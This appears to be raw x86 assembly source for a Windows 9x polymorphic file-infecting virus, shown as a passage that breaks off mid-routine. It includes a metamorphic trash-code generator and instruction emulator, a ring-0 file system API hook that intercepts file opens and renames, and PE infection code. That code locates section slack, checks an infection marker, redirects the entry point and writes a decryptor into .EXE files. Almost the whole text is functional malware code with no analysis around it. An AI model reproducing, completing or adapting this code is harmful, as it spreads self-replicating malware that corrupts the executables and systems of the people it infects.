     ParseTrash:
        xor     eax,eax
        lodsb
        mov     [HowMuchTrash+ebp],eax
        ret

     ParseDontParse:
        xor     eax,eax
        lodsb
        mov     ecx,eax
        add     edi,16
        and     edi,0fffffff0h
        rep     movsb
        ret

     TemporaryParseJump:
        add     edi,16
        and     edi,0fffffff0h

        call    OutputPrefix
        mov     eax,Op_jmp
        bswap   eax
        stosd

        call    GetOperand

        add     eax,'0'
        add     eax,']'*256
        shl     eax,16
        mov     ax,'R['
        stosd
        ret



  ParseInstruction:
        mov     ecx,[ParseInstructionData+ebp]
        lea     edi,[ParseInstructionData+ebp+4]
        repnz   scasd
        pop     edi
        test    ecx,ecx
        jz      MutateEnd


        lea     ebx,[InstuctionTablesEnd+ebp]
        imul    ecx,ecx,8

        sub     ebx,ecx
        push    ebx

     ParseOperands:
        call    GetOperand
        sub     ebx,4

        push    ebx                             ; ToType
        push    eax                             ; ToOperand

        inc     esi
        call    GetOperand
        push    ebx                             ; FromTypeOfValue
        push    eax                             ; FromOperand

        mov     [EndValue+ebp],eax
        mov     [EndTypeOfValue+ebp],ebx

        call    GenerateTrash

        mov     eax,[esp+8]                     ; ToOperand
        mov     ebx,[esp+12]                    ; ToType
        mov     ecx,Writeable
        call    DeleteFromInfo

        pop     [FromOperand+ebp]
        pop     [FromTypeOfValue+ebp]

        pop     eax
        pop     ebx
        mov     [ToOperand+ebp],eax
        mov     [ToType+ebp],ebx

        mov     ecx,Writeable
        call    DeleteFromInfo


        pop     [EmulateInstruction+ebp]

        call    OutputPrefix
        call    EmuProc

        call    GenerateTrash
        ret


; return
; eax = register or number
; ebx =
; 0 = value/number
; 4 = value/register
; 8 = memory/number
; 12 = memory/register


; return
; EBX = 0 if value and 4 if memory
;                       |'V' or 'M'
;                       |
;               db     "M"
ReadTypeOfData:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        cmp     al,'M'
        sete    bl
        shl     bl,3
        ret

; return
; EAX = the number or register
; EBX = 0 if number and 4 if register

; This procedure is in the "copy to ring 0" mem.

;GetOperand:
;        xor     edx,edx
;        mov     al,byte ptr [esi]
;        cmp     al,'['
;        setz    dl
;        mov     ecx,edx
;        add     esi,edx
;        shl     edx,3
;        mov     ebx,edx                         ; ebx = 0 or 8

;        lodsb
;        cmp     al,'S'                          ; A variable
;        jnz     Label53

;        mov     eax,[PointerToDataSlack+ebp]
;        mov     edx,[esi]
;        mov     eax,[eax+edx*4]
;        mov     [esi],eax
;        mov     eax,'V'
;        xor     edx,edx
;
;     Label53:
;        cmp     al,'R'
;        setz    dl
;        shl     edx,2
;        add     ebx,edx                         ; ebx = ebx + (0 or 4)
;
;        test    edx,edx                         ; is value
;        jz      ReadValue
;
;        xor     eax,eax
;        lodsb                                   ; read register

;        cmp     al,'X'
;        jz      GetRandomReg

;        sub     eax,'0'

;        add     esi,ecx
;        ret

;   ReadValue:
;        lodsd
;        add     esi,ecx
;        ret


GetRandomReg:
        push    ebx
        call    AsciiToNum
        add     esi,ecx
        shl     eax, 2
        lea     eax,[eax+ebp+RandomRegs]        ; eax -> RandomReg
        mov     ebx,[eax]

        cmp     ebx,Uninitialized
        jz      GetRandomRegPtrInitialize       ; There is no RnR
                                                ; Xx, create one
        xchg    eax,ebx                         ; eax = Xx
        pop     ebx
        ret

GetRandomRegPtrInitialize:
        push    eax


        call    GetWriteableReg
        pop     ebx

        mov     [ebx],eax                       ; Mov RR,Random Operand
        pop     ebx
        ret



























; -----------------------------------------------
; ---------------------------- Generic polymorher
; -----------------------------------------------

; This proc takes data from WhereFrom and WhereTo and
; creates instructions from that data.

HowMuchTrash                    dd      LinesOfTrash

RandomProcs:
        db      6                               ; number of instructions

        db      6                               ; how often it should come up
        db      2
        db      1
        db      1
        db      1
        db      1

        dd      MovPos
        dd      AddPos
        dd      SubPos
        dd      OrPos
        dd      XorPos
        dd      AndPos



  GenerateTrash:
        mov     eax,[HowMuchTrash+ebp]          ; 1/LinesOfTrash that we
                                                ; stop creating trash
        inc     eax
        call    Random

        test    eax,eax
        jz      Return




        call    GetWriteable
        mov     [ToOperand+ebp],eax
        mov     [ToType+ebp],ebx

        call    RandomOperand
        mov     [FromOperand+ebp],eax
        mov     [FromTypeOfValue+ebp],ebx

        lea     ebx,[RandomProcs+ebp]

        xor     eax,eax
        xor     ecx,ecx
        xor     edx,edx
        mov     cl, byte ptr [ebx]

      Label36:
        inc     ebx
        mov     dl, byte ptr [ebx]
        add     eax,edx
        loop    Label36

        call    Random

        lea     ebx,[RandomProcs+ebp]

      Label37:
        inc     ebx
        mov     dl, byte ptr [ebx]
        sub     eax, edx
        jnc     Label37

        lea     eax,[RandomProcs+ebp]
        sub     ebx,eax
        dec     ebx
        shl     ebx,2
        inc     ebx

        mov     dl,byte ptr [eax]
        add     ebx,edx
        add     ebx,eax

        mov     ebx,[ebx]

        lea     ebx,[InstructionData+ebx*8+ebp]

        mov     [EmulateInstruction+ebp],ebx
        call    EmuProc
        jmp     GenerateTrash


; ------------------------------------------------
; ---------------------------- Emulation functions
; ------------------------------------------------

  AddInstruction:
        add     [eax+edx],ecx
        ret

  SubInstruction:
        sub     [eax+edx],ecx
        ret

  MovInstruction:
        xor     ebx,ebx
        mov     dword ptr [eax],ebx
        mov     dword ptr [eax+4],ebx
        mov     dword ptr [eax+8],ebx
        mov     dword ptr [eax+12],ebx

        mov     [eax+edx],ecx

        ret

   OrInstruction:
        or      [eax+edx],ecx
        ret

   XorInstruction:
        xor     [eax+edx],ecx
        ret

   AndInstruction:
        and     [eax+edx],ecx
        ret

EmulateInstruction      dd      0

ToOperand               dd      0
ToType                  dd      0

FromOperand             dd      0
FromTypeOfValue         dd      0

EmuProc:

ChangeRegPart:
        mov     eax,[ToOperand+ebp]
        mov     ebx,[ToType+ebp]

        mov     edx,[EmulateInstruction+ebp]
        mov     edx,[edx+4]
        shr     ebx,2
        inc     ebx
        call    OutputOpcode
        dec     ebx
        shl     ebx,2

        call    UndefineDependentOperands

        pushad
        mov     ebx,[EmulateInstruction+ebp]
        mov     ebx,[ebx+4]

        cmp     ebx,Op_mov
        jnz     Label34

        mov     eax,[ToOperand+ebp]
        mov     ebx,[ToType+ebp]
        mov     ecx,Undefined
        call    DeleteFromInfo
     Label34:
        popad


        call    IsOperandUndefined
        jz      ChangeOutput

        call    GetTable

        mov     ecx,[FromOperand+ebp]
        mov     edx,[FromTypeOfValue+ebp]

        xor     ebx,ebx

        test    edx,edx
        jz      ValueIsProperlyEmulated_DontNeedThisHack

        add     ebx,[eax]
   ValueIsProperlyEmulated_DontNeedThisHack:
        add     ebx,[eax+4]
        add     ebx,[eax+8]
        add     ebx,[eax+12]
        test    ebx,ebx
        jnz     MakeUndefined

   YesChangeIt:
        mov     ebx,[EmulateInstruction+ebp]
        mov     ebx,[ebx]
        add     ebx,ebp
        call    ebx

   ChangeOutput:
        call    GetEqualValue

        shr     ebx,2

        call    Output
        ret

   MakeUndefined:
        mov     ebx,Undefined
        or      [eax+InfoPtr],ebx
        jmp     ChangeOutput


FoundEquals             dd      0
ReadFromType            dd      0

GetEqualValue:
        xor     ebx,ebx                         ; register table

        mov     [FoundEquals+ebp],ebx
        mov     [ReadFromType+ebp],ebx

        mov     ecx,Registers
        call    CompareOperands

        mov     ecx,[ToType+ebp]
        cmp     ecx,4
        jae     DontTryMemory

        mov     ecx,MemorySize
        mov     [ReadFromType+ebp],4
        call    CompareOperands

   DontTryMemory:

        push    [FromOperand+ebp]
        push    [FromTypeOfValue+ebp]

        mov     eax,[FoundEquals+ebp]
        inc     eax
        mov     ecx,eax
        call    Random


        imul    eax,eax,8
        mov     ebx,[esp+eax]
        mov     eax,[esp+eax+4]                 ; eax = Operand

        imul    ecx,ecx,8
        add     esp,ecx

        test    ebx,ebx
        jz      Return                          ;

        mov     ecx,Writeable
        call    DeleteFromInfo                  ; delete writeable from mem
                                                ; might still create bugs!!!
                                                ; will be fixed in the future
                                                ; (the odds a bug will happen
                                                ; is extremly low)

        ret

 CompareOperands:
        pop     [ReturnAddress+ebp]
        inc     ecx
     CmpLoop:
        dec     ecx
        jnz     Label30
        jmp     [ReturnAddress+ebp]
     Label30:

        mov     eax,ecx
        mov     ebx,[ReadFromType+ebp]

        call    ReadOperand

        cmp     eax,[FromOperand+ebp]
        jnz     CmpLoop

        cmp     ebx,[FromTypeOfValue+ebp]
        jnz     CmpLoop

        cmp     ecx,[ToOperand+ebp]
        jz      CmpLoop

        push    ecx                             ; Operand
        mov     ebx,[ReadFromType+ebp]          ; Type
        add     ebx,4
        push    ebx
        inc     [FoundEquals+ebp]
        jmp     CmpLoop


UndefineDependentOperands:
        call    IsOperandUndefined
        jnz     Return

        pushad
        xor     ebx,ebx
        mov     ecx,Registers

        call    Undefine

        mov     ebx,4
        mov     ecx,MemorySize
        call    Undefine

        popad
        ret


    Undefine:
        inc     ecx
        mov     edx,ebx
      UndefineLoop:

        dec     ecx
        jz      Return

        mov     eax,ecx
        mov     ebx,edx
        cmp     eax,[ToOperand+ebp]
        jz      UndefineLoop

        call    ReadOperand
        sub     ebx,4
        cmp     ebx,[ToType+ebp]
        jnz     UndefineLoop

        cmp     eax,[ToOperand+ebp]
        jnz     UndefineLoop



        push    ecx
        mov     eax,ecx
        mov     ebx,edx
        mov     ecx,Undefined
        call    SetInfo
        pop     ecx
        jmp     UndefineLoop


; -----------------------------------------------
; -------------------------- High level functions
; -----------------------------------------------




RandomOperand:
        mov     eax,3+EndValueFrecuency
        shr     ebx,2                           ; ebx = 0 or 1
        sub     eax,ebx                         ; eax = 3 or 2

        call    Random
        xor     ebx,ebx

        test    eax,eax
        jz      Random                          ; eax = 1 or 2

        dec     eax
        jz      GetReadableReg


        sub     eax,EndValueFrecuency+1
        jz      GetReadable

        mov     eax,[EndValue+ebp]
        mov     ebx,[EndTypeOfValue+ebp]
        and     ebx,111b
        ret


GetWriteableReg:
        call    GetWriteableLabel1
        test    ebx,ebx
        jnz     GetWriteableReg
        ret

; Returns a writeable operand
GetWriteable:
        mov     eax,3                           ; create more reg then
        call    Random                          ; mem
        test    eax,eax
        jnz     GetWriteableReg

    GetWriteableLabel1:

        call    GetReadable
        mov     ecx,Writeable
        sub     ebx,4
        call    TestInfo
        jnz     GetWriteableLabel1
        ret


GetReadableReg:
        call    GetReadable
        cmp     ebx,4
        jnz     GetReadableReg
        ret


; Returns a operand
GetReadable:
        mov     ebx,4

        mov     eax,Registers+MemorySize
        call    Random
        inc     eax
        cmp     eax,Registers+1
        jl      Return

        shl     ebx,1
        sub     eax,Registers+1
        ret





; input
; eax = register or number
; ebx = number or register and value or mem
; ebx = 0 = number
; ebx = 1 = register
; ebx = 2 = [number]
; ebx = 3 = [register]



; ------------------------------------------
; ---------------------- Low level functions
; ------------------------------------------

Random:
        push    ebx
        push    ecx
        push    edx

        mov     ebx,eax

        add     eax,[RandomNumber+ebp]
        mov     cl,al
        rol     eax,cl
        add     eax,14
        xor     ecx,46
        ror     eax,cl
        add     eax,ecx
        xor     [RandomNumber+ebp],eax

        test    ebx,ebx
        jz      NoMod

        xor     edx,edx
        div     ebx
        xchg    eax,edx
   NoMod:
        pop     edx
        pop     ecx
        pop     ebx

        ret


; input
; edx = opcode

OutputOnlyOpcode:
        add     edi,16
        and     edi,0fffffff0h
        bswap   edx
        mov     [edi],edx
        add     edi,4
        ret

OutputOpcode:
        call    OutputOnlyOpcode
        jmp     OutputNotComma

Output:
        mov     byte ptr [edi],','
        inc     edi

OutputNotComma:
        push    ecx
        xor     ecx,ecx
        cmp     ebx,1
        setbe   cl
        lea     ecx,[ecx*8+ecx]
        push    ecx
        test    ecx,ecx
        jnz     Label10
        mov     byte ptr [edi],'['
        inc     edi

     Label10:

        test    ebx,1
        setnz   cl

        shl     ecx,2
        add     ecx,'N'
        mov     byte ptr [edi],cl
        inc     edi
        cmp     ecx,'N'
        jz      OutputNumber
        add     eax,'0'
        stosb
        sub     eax,'0'
   Label11:
        pop     ecx
        test    ecx,ecx
        jnz     Label12

        mov     byte ptr [edi],']'
        inc     edi

   Label12:
        pop     ecx

        ret

   OutputNumber:
        pop     ecx
        push    ecx
        test    ecx,ecx
        setnz   cl

        push    eax
        mov     eax,'S'
        mov     byte ptr [edi+ecx-1],al         ; variable
        pop     eax
        stosd

        jmp     Label11


GetTable:
        cmp     ebx,8
        stc
        jz      Return

        dec     eax
        imul    eax,eax,20                      ; TableSize
        add     eax,[Tables+ebx+ebp]
        clc
        ret



SetInfo:
        push    eax
        call    GetTable
        jc      ReturnPopEax
        or      [eax+InfoPtr],ecx               ; Set attribute
        pop     eax
        ret

DeleteFromInfo:
        push    eax
        call    GetTable
        jc      ReturnPopEax
        or      [eax+InfoPtr],ecx               ; Set attribute
        xor     [eax+InfoPtr],ecx               ; Clear it
        pop     eax
        ret

ChangeInfo:
        push    eax
        call    GetTable
        jc      ReturnPopEax
        mov     [eax+InfoPtr],ecx
        pop     eax
        ret


IsOperandUndefined:
        push    ecx
        mov     ecx,Undefined



        call    TestInfo
        pop     ecx
        jz      Return
        jc      SetZeroFlag
        ret
SetZeroFlag:
        cmp     eax,eax
        ret


TestInfo:
        push    eax
        call    GetTable

        jc      ReturnPopEax
        test    [eax+InfoPtr],ecx
        mov     ecx,0
        setnz   cl
        lahf
        shl     cl,6
        btr     ax,6+8
        or      ah,cl
        sahf
        pop     eax
        clc
        ret




; eax = The operand
; ebx
; Which table to read from

ReadOperand:
        call    IsOperandUndefined
        jz      OperandIsUndefined
        call    GetTable


        push    ecx
        xor     ebx,ebx
        mov     ecx,16


     FindValueLoop:
        sub     ecx,4
        jecxz   Label32

        cmp     [eax+ecx],ebx
        jz      FindValueLoop

      Label32:
        mov     ebx,ecx
        mov     eax,[eax+ecx]
        pop     ecx
        ret

OperandIsUndefined:
        add     ebx,4
        ret


ReturnPopEax:
        pop     eax
        ret


GetWhereFrom:
        lea     ebx,[FromWhere+ebp-4]
        jmp     GodDamnedLabelDammit
GetWhereTo:
        lea     ebx,[EndWhere+ebp-4]
   GodDamnedLabelDammit:
        push    ebx
        xor     eax,eax
        dec     eax
     GodDamnedLoopDammit:
        add     ebx,4
        cmp     eax,[ebx]
        jz      GodDamnedLoopDammit
        mov     eax,[ebx]
        sub     ebx,[esp]
        sub     ebx,4
        add     esp,4
        ret

OutputPrefix:
        push    eax

        xor     eax,eax
        cmp     eax,[Prefix+ebp]
        jz      OutputPrefixEnd

        add     edi,16
        and     edi,0fffffff0h
        mov     eax,Op_db
        bswap   eax
        stosd
        xor     eax,eax
        inc     eax
        stosb
        xor     eax,eax
        xchg    eax,[Prefix+ebp]

        stosb

OutputPrefixEnd:
        pop     eax
        ret










Optimize:
        call    ClearDoNothingInstrucions
;       call    ClearUnnessesaryInstructions

        xchg    esi,edi


        ret


MaybeUnnessesaryInstructions:
        dd      Op_mov, Op_add, Op_sub, Op_and, Op_or, Op_xor
MaybeUnnessesaryInstructionsEnd:

ClearUnnessesaryInstructions:
        push    edi

        sub     esi,16

    ClearUnnessesaryInstructionsLoop:
        push    edi
        add     esi,16
        and     esi,0fffffff0h
        lodsd
        bswap   eax

        lea     edi,[MaybeUnnessesaryInstructions+ebp]
        mov     ecx,(MaybeUnnessesaryInstructionsEnd-MaybeUnnessesaryInstructions)/4
        repnz   scasd

        test    ecx,ecx
        jz      DontOptimize2

        xor     eax,eax

      .while (al!=',')
        lodsb

      .endw

        mov     edi,esi
        mov     ecx,1000h
      FindNextEntry:
;        rep     scasb
        jecxz   DontOptimize2

        mov     ebx,edi
        and     edi,0fffffff0h
        sub     ebx,edi
        cmp     ebx,4
        jz      DontOptimize2

        mov     ebx,Op_mov
        cmp     [edi],ebx
        jnz     FindNextEntry
        pop     edi
        jmp     ClearUnnessesaryInstructionsLoop

   DontOptimize2:
        pop     edi
        and     esi,0fffffff0h
        mov     ecx,16
        rep     movsb
        sub     esi,16
        jmp     ClearUnnessesaryInstructionsLoop



        pop     edi
        ret


ClearDoNothingInstrucions:
        push    edi
        sub     esi,16
        xor     ecx,ecx

     OptimizeLoop:

        add     esi,16
        and     esi,0fffffff0h
        push    esi

        lodsd
        test    eax,eax
        jz      OptimizeEnd

        bswap   eax
        cmp     eax,Op_mov
        jnz     DontOptimize

        xor     eax,eax
        lodsw
        mov     ebx,eax
        lodsb
        lodsw
        cmp     ebx,eax
        jnz     DontOptimize
        pop     esi
        jmp     OptimizeLoop

     DontOptimize:
        mov     ecx,16
        pop     esi
        rep     movsb
        sub     esi,16
        jmp     OptimizeLoop

     OptimizeEnd:
        test    ecx,ecx
        jnz     OptimizeDoReallyQuit

        mov     ecx,16
        pop     esi
        rep     movsb
        sub     esi,16

        inc     ecx
        jmp     OptimizeLoop


     OptimizeDoReallyQuit:
        pop     eax
        pop     edi
        ret







; 1. Init block

; offset 0
; pushad

; 2. Make pointer to mem

; 3. Read block
;    Encrypt block
;    Write block

; popad

; 5. Change mempointer block
; 6. Compare and jump block

























































































































PE_Objects              equ     6
PE_NTHdrSize            equ     20
PE_Entrypoint           equ     40
PE_ImageBase            equ     52
PE_ObjectAlign          equ     56
PE_FileAlign            equ     60
PE_ImageSize            equ     80

Obj_Name                equ     0
Obj_VirtualSize         equ     8
Obj_VirtualOffset       equ     12
Obj_PhysicalSize        equ     16
Obj_PhysicalOffset      equ     20
Obj_Flags               equ     36






IFSMgr                          equ     0040h

R0_AllocMem                     equ     000dh
R0_FreeMem                      equ     000eh

Ring0_FileIO                    equ     0032h
InstallFileSystemAPIhook        equ     0067h
UniToBCSPath                    equ     0041h

ResidentcodeStart:

        jmp     FileFunction

R0_OPENCREATFILE		equ	0D500h	; Open/Create a file
R0_READFILE                     equ     0D600h  ; Read a file, no context
R0_WRITEFILE			equ	0D601h	; Write to a file, no context
R0_CLOSEFILE                    equ     0D700h


IFSFN_FILEATTRIB                equ     33
IFSFN_OPEN                      equ     36
IFSFN_RENAME                    equ     37


IFSFN_READ                      equ     0       ; read a file
IFSFN_WRITE                     equ     1       ; write a file



FileIOWrite:
        mov     eax,R0_WRITEFILE
        mov     ebx,[FileHandle+edi]
        pop     [ReturnAddr+edi]
        push    Ring0_FileIO
        jmp     Label6

FileIOReadDWordToSlack:
        mov     ecx,4                           ; how many bytes
FileIOReadToSlack:
        lea     esi,[Slack+edi]                 ; where to place data
FileIORead:
        mov     eax,R0_READFILE
FileIOHandle:
        mov     ebx,[FileHandle+edi]
FileIO:
        pop     [ReturnAddr+edi]
        push    Ring0_FileIO
        jmp     Label6
vxd:
        pop     [ReturnAddr+edi]
Label6:
        pop     [CallService+edi+2]
        mov     word ptr [CallService+edi],20cdh
        mov     word ptr [CallService+edi+4],0040h
        jmp     CallService

CallService:
Slack:
        int     20h
        dw      0dh
        dw      0040h
        jmp     [ReturnAddr+edi]


ZeroRegStart:


                                db      0
        FileToInfect            db      256 dup (0)

        TempPtr                 dd      0

        TotalSize               dd      0
        OldAPIFunction          dd      0
        GuidePos                dd      0
        GuideSize               dd      0
        DecryptorPos            dd      0
        DecryptorSize           dd      0

        HeaderSize              dd      0

        VirusInRing0Mem         dd      0

        MemoryTable             dd      0
        VirtualDataSegment      dd      0

        ReturnAddr              dd      0
        ReturnAddr2             dd      0

        Flag                    dd      0

        FileHandle              dd      0
        PEHeadOfs               dd      0
        PEHeadStart             dd      0
        ObjTable                dd      0

        CodeObjectPtr           dd      0
        DataObjectPtr           dd      0
        LastObjectPtr           dd      0

        SlackInCodeSegment      dd      0
        SlackInDataSegment      dd      0

        OldRVA                  dd      0
        StackSave               dd      0

        NewVirusOffset          dd      0
        JumpTableMoveOffset     dd      0

        NewGuideOffset          dd      0
        NewDecryptorOffset      dd      0
        NewDataSegmentOffset    dd      0

        Unload                  dd      0
ZeroRegEnd:

   ; eax = how much free space
   ; ebx = where it is located
   ; ecx = pointer to segment object table
   ; edx = last object pointer




   GetSegmentSlack:
        pop     [ReturnAddr2+edi]

        mov     eax,[PEHeadStart+edi]
        lea     ebx,[eax+24]

        xor     ecx,ecx
        mov     cx,[eax+PE_NTHdrSize]           ; NT hdr size

        add     ebx,ecx                         ; ebx -> object table

        mov     cx,[eax+PE_Objects]             ; # objects
        imul    ecx,ecx,40

        add     ecx,ebx
        push    ecx                             ; push pointer to last object
                                                ; + 40
   FindCodeSegmentLoop:
        sub     ecx,8*5
        cmp     ecx,ebx
        jl      DidntFindSegment

        cmp     dword ptr [ecx],edx             ; is code object?
        jnz     FindCodeSegmentLoop

        pop     edx                             ; pop pointer to last object
        sub     edx,40

        mov     eax,[ecx+Obj_PhysicalSize]      ; size of segment
        mov     ebx,[ecx+Obj_PhysicalOffset]    ; where does segment start

        call    CalculateFreeSpace
        jmp     [ReturnAddr2+edi]

   DidntFindSegment:
        pop     eax
        xor     eax,eax
        jmp     [ReturnAddr2+edi]


        SegmentSize             dd      0
        SegmentOffset           dd      0
        SegmentBuffer           dd      0

CalculateFreeSpace:
        push    ecx
        push    edx

        mov     [SegmentSize+edi],eax
        mov     [SegmentOffset+edi],ebx

        push    eax
        push    R0_AllocMem
        call    vxd
        pop     ecx
        test    eax,eax
        jz      FileFunctionEndAddEsp

        mov     [SegmentBuffer+edi],eax

        mov     edx,[SegmentOffset+edi]         ; read from
        mov     esi,eax                         ; read to
        mov     ecx,[SegmentSize+edi]           ; how much to read
        call    FileIORead

        mov     ebx,edi

        mov     edi,[SegmentBuffer+ebx]

        add     edi,[SegmentSize+ebx]
        sub     edi,4                           ; edi -> end of segment

        push    edi                             ; push end of seg

        xor     eax,eax
        xor     ecx,ecx
        dec     ecx

        std
        repz    scasb
        cld
        dec     eax
        sub     eax,ecx

        mov     edi,ebx

        pop     ebx                             ; end of seg
        sub     ebx,8                           ; decrease some


        push    eax                             ; push number of slack bytes

        mov     eax,[SegmentBuffer+edi]
        sub     ebx,eax
        push    eax
        push    R0_FreeMem
        call    vxd
        pop     eax

        pop     eax                             ; eax = slackbytes in codeseg
        sub     eax,20                          ; some safety
        sub     ebx,eax                         ; where slack starts

        pop     edx
        pop     ecx
        ret















; ----------------------------------------
; --------------------------- FileFunction
; ----------------------------------------

FileFunction:
        push    ebp

        mov     ebp,esp
        push    edi
        push    esi
        push    ebx

BasePtr:
        mov     edi,66666666h

        cmp     [Unload+edi],1
        jz      CallInOurFunction


        xor     eax,eax
        inc     eax
        cmp     [Flag+edi],eax
        jz      CallInOurFunction

        mov     [Flag+edi],eax
        mov     eax,[ebp+12]

        cmp     eax,IFSFN_OPEN
        jz      CheckFilename

        cmp     eax,IFSFN_FILEATTRIB
        jz      CheckFilename

        cmp     eax,IFSFN_RENAME
        jnz     FileFunctionEnd

   CheckFilename:

        mov     eax,[ebp+16]

        test    eax,eax
        jz      FileFunctionEnd

        cmp     eax,0ffh
        jz      FileFunctionEnd

        cmp     eax,25
        ja      FileFunctionEnd

        add     eax,'a'-1
        add     eax,':'*256

        lea     esi,[FileToInfect+edi]

        mov     word ptr [esi],ax

        add     esi,2

        push    0
        push    250
        mov     eax,[ebp+28]
        mov     eax,[eax+12]
        add     eax,4
        push    eax
        push    esi

        push    UniToBCSPath
        call    vxd
        add     esp,16

        mov     byte ptr [esi+eax],0

        cmp     dword ptr [esi+eax-4],'EXE.'
        jne     FileFunctionEnd

        xor     ebx,ebx
        cmp     dword ptr [esi+1],'OLNU'        ; is catalog starting on unlo
        setz    bl
        mov     [Unload+edi],ebx                ; unload virus then


        cmp     dword ptr [esi],'FNI'          ; dont infect files in win*
        jne     FileFunctionEnd                 ; if there is a bug we dont
                                                ; to hurt system critical
                                                ; files



        sub     esi,2
        mov     bx,2
        mov     cx,0
        mov     dx,1h
        mov     eax,R0_OPENCREATFILE
        call    FileIO
        jc      FileFunctionEnd


        mov     [FileHandle+edi],eax

        xor     edx,edx                         ; where to read in file
        call    FileIOReadDWordToSlack
        jc      FileFunctionEndCloseFile


        cmp     word ptr [Slack+edi],'ZM'
        jnz     FileFunctionEnd

        mov     edx,3ch                         ; where to read in file
        call    FileIOReadDWordToSlack

        mov     edx,[Slack+edi]
        mov     [PEHeadOfs+edi],edx

        call    FileIOReadDWordToSlack

        cmp     word ptr [Slack+edi],'EP'
        jnz     FileFunctionEndCloseFile

        mov     edx,[PEHeadOfs+edi]
        add     edx,84
        call    FileIOReadDWordToSlack

        mov     ecx,[Slack+edi]                 ; size of exehead, pehead and
                                                ; objtable

        mov     edx,[PEHeadOfs+edi]
        sub     ecx,edx                         ; size of pehead and objtable

        cmp     ecx,1000h
        ja      FileFunctionEndCloseFile

        mov     [HeaderSize+edi],ecx
        lea     eax,[ecx+20]

; allocate mem for PEHeader
        push    eax
        push    R0_AllocMem
        call    vxd
        pop     ecx
        test    eax,eax
        jz      FileFunctionEndCloseFile


        mov     ecx,[HeaderSize+edi]
        mov     edx,[PEHeadOfs+edi]
        mov     esi,eax
        mov     [PEHeadStart+edi],esi
        call    FileIORead

        mov     eax,[PEHeadStart+edi]
        cmp     word ptr [eax],'EP'
        jnz     FileFunctionEndAddEsp

        mov     ebx,'y3k?'                      ; already infected
        cmp     [eax+12],ebx
        jz      FileFunctionEndAddEsp



        mov     edx,'xet.'
        call    GetSegmentSlack

   ; eax = how much free space
   ; ebx = where it is located
   ; ecx = pointer to segment object table
   ; edx = pointer to last object table




        cmp     eax,[GuideSize+edi]
        jl      FileFunctionEndAddEsp

        mov     [CodeObjectPtr+edi],ecx         ; save offset of code object
        mov     [SlackInCodeSegment+edi],ebx

        mov     edx,'tad.'
        call    GetSegmentSlack
        test    eax,eax
        jz      FileFunctionEndAddEsp


        mov     [DataObjectPtr+edi],ecx         ; save offset of data object
        push    eax
        push    ebx
  .if (ecx==edx)
        mov     ebx,[PEHeadStart+edi]
        mov     eax,[ebx+PE_FileAlign+8]        ; file align
  .else
        mov     eax,[ecx+Obj_PhysicalSize]      ; physical size
  .endif




        mov     ebx,[ecx+Obj_VirtualSize]       ; - virtual size
        sub     eax,ebx                         ; = free space

        mov     [SlackInDataSegment+edi],ebx

        cmp     eax,MemorySize*4                ; if this is true we can be
        jg      InfectFile                      ; 'sure' no bug will occure.

        add     eax,ebx                         ; size of .data segment on
                                                ; disk
        sub     eax,MemorySize*4+10             ; some safety

        pop     ebx                             ; where in file the zero
        add     ebx,200h                        ; slack starts
        sub     eax,ebx
        pop     eax                             ; size of slack block
        jc      FileFunctionEndAddEsp

        sub     eax,250h+MemorySize*4           ; enough mem free
        jc      FileFunctionEndAddEsp           ; this method is more risky
                                                ; will bug out if the
                                                ; infected program relies
                                                ; on the data to be cleared
        sub     esp,8
        mov     [SlackInDataSegment+edi],ebx

    InfectFile:
        add     esp,8

        mov     [LastObjectPtr+edi],edx         ; ptr to last object table

        mov     ecx,[PEHeadStart+edi]
        mov     edx,[ecx+PE_Entrypoint]         ; save old RVA
        mov     [OldRVA+edi],edx


        mov     ecx,[CodeObjectPtr+edi]
        mov     ebx,[SlackInCodeSegment+edi]


BreakPoint:

        mov     eax,ebx                         ; ebx = how far in is free
                                                ; space
        add     ebx,[ecx+Obj_VirtualOffset]     ; ebx = free space in mem

        mov     edx,[PEHeadStart+edi]
        mov     [edx+PE_Entrypoint],ebx         ; save new RVA


        add     eax,[ecx+Obj_PhysicalOffset]    ; eax = free space in file
        mov     [NewGuideOffset+edi],eax


        mov     ecx,[DataObjectPtr+edi]

        mov     eax,[ecx+Obj_VirtualOffset]     ; data space in mem
        add     eax,[SlackInDataSegment+edi]    ; free data space in mem
        add     eax,(MemorySize-1)*4
        add     eax,[edx+PE_ImageBase]          ; add with image base

        mov     ecx,MemorySize
        mov     ebx,[MemoryTable+edi]

        mov     edx,0ch
        mov     [ebx+ecx*4],edx                 ; used in fs:[0c]

        sub     ebx,4

     CopyPointersToMem:
        mov     [ebx+ecx*4],eax
        sub     eax,4
        dec     ecx
        jnz     CopyPointersToMem

        add     ebx,4
        mov     [PointerToDataSlack+edi],ebx


        mov     ebx,[LastObjectPtr+edi]
        mov     eax,[VirtualDataSegment+edi]


        mov     ecx,[ebx+Obj_VirtualOffset]     ; virtual offset
        add     ecx,[ebx+Obj_PhysicalSize]      ; physical size
        mov     edx,[PEHeadStart+edi]
        add     ecx,[edx+PE_ImageBase]          ; add with imagebase

        mov     [eax+8],ecx                     ; Decryptor Entrypoint

        mov     edx,[OldRVA+edi]
        mov     ebx,[PEHeadStart+edi]
        add     edx,[ebx+PE_ImageBase]          ; add with image base
        mov     [eax],edx                       ; Program entrypoint

        mov     ebx,[DataObjectPtr+edi]
        mov     ecx,[ebx+Obj_VirtualOffset]     ; Virtual offset
        add     ecx,[SlackInDataSegment+edi]    ; Virtual offset of data slack
        mov     edx,[PEHeadStart+edi]
        add     ecx,[edx+PE_ImageBase]          ; add with image base

        mov     [eax+4],ecx

        mov     ecx,[ebx+Obj_PhysicalOffset]
        add     ecx,[SlackInDataSegment+edi]    ; Physical offset of data slack

        mov     [NewDataSegmentOffset+edi],ecx

        mov     ebx,[LastObjectPtr+edi]

        mov     ecx,[ebx+Obj_PhysicalSize]      ; physical size
        add     ecx,[ebx+Obj_PhysicalOffset]    ; physical offset

        mov     [NewDecryptorOffset+edi],ecx    ; Entrypoint in file

        mov     edx,[eax+8]                     ; decryptor start
        add     edx,[DecryptorSize+edi]
        mov     [eax+12],edx                    ; save where to start decrypt


; write Guide
        pushad

        mov     esi,[GuidePos+edi]

        mov     eax,[GuideSize+edi]
        add     eax,100

; allocate mem for PEHeader
        push    eax
        push    R0_AllocMem
        call    vxd
        pop     ecx
        test    eax,eax
        jz      FileFunctionEndCloseFile

        mov     [TempPtr+edi],eax

        push    edi
        mov     ebp,edi
        mov     edi,eax

        call    Compile
        pop     edi

        mov     edx,[NewGuideOffset+edi]        ; write to
        mov     ecx,[GuideSize+edi]             ; write ecx bytes
        call    FileIOWrite

